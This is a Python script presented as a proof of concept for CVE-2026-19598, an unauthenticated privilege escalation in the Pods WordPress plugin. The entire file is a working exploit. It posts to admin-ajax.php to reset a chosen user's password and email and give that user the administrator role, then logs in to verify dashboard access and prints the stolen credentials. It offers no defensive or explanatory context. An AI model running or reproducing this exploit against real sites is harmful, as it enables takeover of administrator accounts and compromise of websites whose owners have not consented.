#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import string
import sys
import re
import argparse

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!$%^&*()-_=+"
    return ''.join(random.choices(chars, k=length))

def generate_email():
    return f"pwn_{random.randint(100000,999999)}@evil.tld"

def extract_wp_nonce(html_content):
    match = re.search(r'name="_wpnonce" value="([^"]+)"', html_content)
    return match.group(1) if match else None

async def verify_login(session, base_url, email, password):
    login_url = f"{base_url}/wp-login.php"
    admin_url = f"{base_url}/wp-admin/"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        async with session.get(login_url, headers=headers, ssl=False) as resp:
            if resp.status != 200:
                return False
            login_page = await resp.text()
            nonce = extract_wp_nonce(login_page)
        login_data = {
            "log": email, "pwd": password,
            "wp-submit": "Log In", "redirect_to": admin_url, "testcookie": "1",
        }
        if nonce:
            login_data["_wpnonce"] = nonce
        async with session.post(login_url, data=login_data,
                                headers=headers, ssl=False, allow_redirects=True) as resp:
            if "wp-admin" in str(resp.url):
                async with session.get(admin_url, headers=headers, ssl=False) as admin_resp:
                    if admin_resp.status == 200:
                        content = await admin_resp.text()
                        if "Dashboard" in content:
                            return True
        return False
    except Exception:
        return False

async def exploit_single_site(base, target_id):
    url = f"{base}/wp-admin/admin-ajax.php"
    email = generate_email()
    password = generate_password()

    params = {"meta-box-loader": "1"}
    data = {
        "action": "pods_admin",
        "method": "save_user",
        "ID": str(target_id),
        "user_pass": password,
        "user_email": email,
        "role": "administrator",
    }
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print(f"[+] Target: {base}")
    print(f"[+] User ID: {target_id}")
    print(f"[+] New email: {email}")
    print(f"[+] New password: {password}")

    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            async with session.post(url, params=params, data=data,
                                    headers=headers, timeout=30, ssl=False) as resp:
                if resp.status == 200:
                    print("[+] Exploit sent, verifying login...")
                    if await verify_login(session, base, email, password):
                        print("[✓] SUCCESS: Admin access verified!")
                        return True
                    else:
                        print("[!] Login verification failed.")
                        return False
                else:
                    print(f"[-] HTTP error: {resp.status}")
                    return False
    except Exception as e:
        print(f"[-] Exception: {e}")
        return False

async def main():
    parser = argparse.ArgumentParser(description="CVE-2026-19598 PoC")
    parser.add_argument("url", help="Target WordPress URL (e.g., http://ex.com)")
    parser.add_argument("--id", type=int, default=1, help="User ID to takeover")
    args = parser.parse_args()

    base = args.url.rstrip('/')
    if not base.startswith(('http://', 'https://')):
        base = 'https://' + base

    print("CVE-2026-19598 - Pods Unauthenticated Privilege Escalation")
    success = await exploit_single_site(base, args.id)
    if success:
        print("\n[+] Exploitation completed successfully.")
    else:
        print("\n[-] Exploitation failed.")


if __name__ == "__main__":
    asyncio.run(main())